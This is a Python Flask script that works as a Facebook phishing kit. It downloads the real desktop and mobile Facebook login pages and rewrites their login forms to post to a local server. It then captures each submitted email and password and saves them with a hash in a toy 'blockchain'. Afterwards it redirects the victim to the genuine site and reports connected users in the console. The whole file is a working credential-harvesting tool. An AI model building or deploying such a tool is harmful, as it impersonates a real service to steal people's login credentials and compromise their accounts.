import requests
from flask import Flask, render_template, request, redirect
import json
import os
from bs4 import BeautifulSoup
import hashlib
from time import time
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

add = '192.168.83.219'
lport = 8080

app = Flask(__name__, template_folder='html')

# Blockchain Implementation
class Block:
    def __init__(self, index, previous_hash, timestamp, user_data, hash_value):
        self.index = index
        self.previous_hash = previous_hash
        self.timestamp = timestamp
        self.user_data = user_data
        self.hash = hash_value

def calculate_hash(block):
    block_string = json.dumps(block.__dict__, sort_keys=True).encode()
    return hashlib.sha256(block_string).hexdigest()

def create_genesis_block():
    return Block(0, "0", time(), "Genesis Block - No user data", "0")

def create_new_block(previous_block, user_data):
    index = previous_block.index + 1
    timestamp = time()
    previous_hash = previous_block.hash
    hash_value = hashlib.sha256(json.dumps(user_data, sort_keys=True).encode()).hexdigest()
    return Block(index, previous_hash, timestamp, user_data, hash_value)

class Blockchain:
    def __init__(self):
        self.chain = [create_genesis_block()]

    def add_block(self, user_data):
        previous_block = self.chain[-1]
        new_block = create_new_block(previous_block, user_data)
        self.chain.append(new_block)
        return new_block

    def is_chain_valid(self):
        for i in range(1, len(self.chain)):
            current_block = self.chain[i]
            previous_block = self.chain[i - 1]
            if current_block.hash != calculate_hash(current_block):
                return False
            if current_block.previous_hash != previous_block.hash:
                return False
        return True

# Initialize Blockchain
blockchain = Blockchain()

def save_user_to_blockchain(user_data):
    blockchain.add_block(user_data)
    print(f"Blockchain updated. User data added: {user_data}")

# HTML Scraper Functions
def getHTML(page):
    headers = {'Accept-Language': 'en-US,en;q=0.5'}
    web_link = 'https://www.facebook.com/'
    mobile_link = 'https://m.facebook.com'

    try:
        if page == 'web':
            response = requests.get(web_link, headers=headers).text
            soup = BeautifulSoup(response, 'html.parser')

            login_form = soup.find('form', {'id': 'login_form'})
            if login_form:
                login_form['action'] = ''
                for attr in ['novalidate', 'onsubmit', 'data-testid']:
                    if attr in login_form.attrs:
                        del login_form[attr]

                email = login_form.find('input', {'id': 'email'})
                psswrd = login_form.find('input', {'id': 'pass'})
                if email:
                    email['value'] = "{{request.form.username}}"
                if psswrd:
                    psswrd['value'] = "{{request.form.password}}"

                with open('fb.html', 'w', encoding='utf-8') as f:
                    f.write(soup.prettify())

        elif page == 'mobile':
            response = requests.get(mobile_link, headers=headers).text
            soup = BeautifulSoup(response, 'html.parser')

            login_form = soup.find('form', {'id': 'login_form'})
            if login_form:
                del login_form['action']
                del login_form['novalidate']

                with open('mobile.html', 'w', encoding='utf-8') as f:
                    f.write(soup.prettify())

        else:
            print("Invalid page type specified.")

    except Exception as e:
        print("Error occurred:", e)

@app.route('/', methods=['GET', 'POST'])
def homepage():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']
        user_data = {'email': email, 'password_hash': hashlib.sha256(password.encode()).hexdigest()}

        # Save to blockchain
        save_user_to_blockchain(user_data)

        # Log to console
        print(f"User Data Saved: {user_data}")

        return redirect('https://www.facebook.com')

    if request.method == 'GET':
        print('[*] User Connected Through Web...')
        return render_template("fb.html")

@app.route('/mob', methods=['GET', 'POST'])
def mobpage():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']
        user_data = {'email': email, 'password_hash': hashlib.sha256(password.encode()).hexdigest()}

        # Save to blockchain
        save_user_to_blockchain(user_data)

        # Log to console
        print(f"User Data Saved: {user_data}")

        return redirect('https://m.facebook.com')

    if request.method == 'GET':
        print('[*] User Connected Through Mobile...')
        return render_template("mobile.html")

if __name__ == '__main__':
    if not os.path.exists('fb.html'):
        print('[*] Getting Web HTML File...')
        getHTML(page='web')

    if not os.path.exists('mobile.html'):
        print('[*] Getting Mobile HTML File...')
        getHTML(page='mobile')

    else:
        print('[*] Files Already Present...')

    print('[*] You will be notified in console as soon as a user connects whether through mobile or web. '
          '\n    Username and Password will be displayed in-console when user submits it as well as will be stored on the blockchain.\n')

    app.run(host='127.0.0.1', port=5000, debug=True)
